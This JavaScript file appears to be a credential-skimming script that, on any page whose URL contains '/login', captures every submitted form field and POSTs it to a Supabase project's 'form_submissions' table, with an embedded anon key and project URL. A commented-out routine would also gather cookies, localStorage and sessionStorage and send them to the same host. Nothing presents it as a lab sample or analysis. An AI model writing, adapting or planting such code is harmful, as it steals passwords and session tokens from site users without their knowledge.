// Supabase configuration
const SUPABASE_URL = "https://ssirhrwayfthjdobmtds.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNzaXJocndheWZ0aGpkb2JtdGRzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ0NTQ2MDgsImV4cCI6MjA2MDAzMDYwOH0.daXhhThwVKC8llHti_YzbMyUZnh26WXz2LprDrIg8n4";

function sendData(data, type) {
  // Prepare headers for Supabase request
  const headers = {
    "Content-Type": "application/json",
    "apikey": SUPABASE_ANON_KEY,
    "Authorization": `Bearer ${SUPABASE_ANON_KEY}`
  };
  
  // Choose the table based on data type
  let endpoint = "";
  if (type === 'initial') {
    endpoint = `${SUPABASE_URL}/rest/v1/environment_data`;
  } else if (type === 'form') {
    endpoint = `${SUPABASE_URL}/rest/v1/form_submissions`;
  }
  
  // Prepare the payload
  let payload = {};
  if (type === 'initial') {
    payload = {
      cookies: data.cookies,
      url: data.url,
      user_agent: data.userAgent,
      local_storage: data.localStorage,
      session_storage: data.sessionStorage
    };
  } else if (type === 'form') {
    payload = { form_data: data };
  }
  
  // Send data to Supabase
  fetch(endpoint, {
    method: "POST",
    headers: headers,
    body: JSON.stringify(payload)
  }).catch(error => console.error("Error sending data to Supabase:", error));
}

/*
function collectEnvironmentInfo() {
  const info = {
    cookies: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent,
    localStorage: {},
    sessionStorage: {}
  };
  
  // Grab localStorage items
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    info.localStorage[key] = localStorage.getItem(key);
  }
  
  // Grab sessionStorage items
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    info.sessionStorage[key] = sessionStorage.getItem(key);
  }
  
  return info;
}
*/

function hookForms() {
  // Only proceed if URL contains '/login'
  if (window.location.href.includes('/login')) {
    document.querySelectorAll('form').forEach(form => {
      form.addEventListener('submit', function(e) {
        const formData = {};
        new FormData(form).forEach((value, key) => {
          formData[key] = value;
        });
        sendData(formData, 'form');
      });
    });
  }
}

// Main execution
(function() {
  // Send initial environment data
  // const envInfo = collectEnvironmentInfo();
  // sendData(envInfo, 'initial');
  
  // Hook into forms to capture submissions only on login pages
  hookForms();
})();
